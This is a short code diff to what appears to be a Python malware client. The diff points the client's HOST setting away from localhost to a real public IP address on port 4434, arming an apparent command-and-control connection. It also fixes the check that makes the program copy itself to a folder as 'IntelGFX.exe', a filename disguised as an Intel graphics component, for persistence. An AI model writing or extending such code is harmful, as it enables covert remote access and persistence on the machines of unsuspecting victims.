@@ -18,8 +18,8 @@ import datetime
 import zlib
 import shutil
 
-#HOST = '109.172.189.74'
-HOST = '127.0.0.1'
+HOST = '109.172.189.74'
+#HOST = '127.0.0.1'
 PORT = 4434
 ACTIVE = False
 
@@ -43,7 +43,7 @@ destination_path = os.path.join(os.path.join(destination_folder, 'IntelGFX.exe')
 file_name = sys.argv[0]
 
 
-if not 'InterGFX' in sys.argv[0]:
+if not 'IntelGFX' in sys.argv[0]:
     if not os.path.exists(destination_path):
         shutil.copy2(sys.argv[0], destination_path)
 
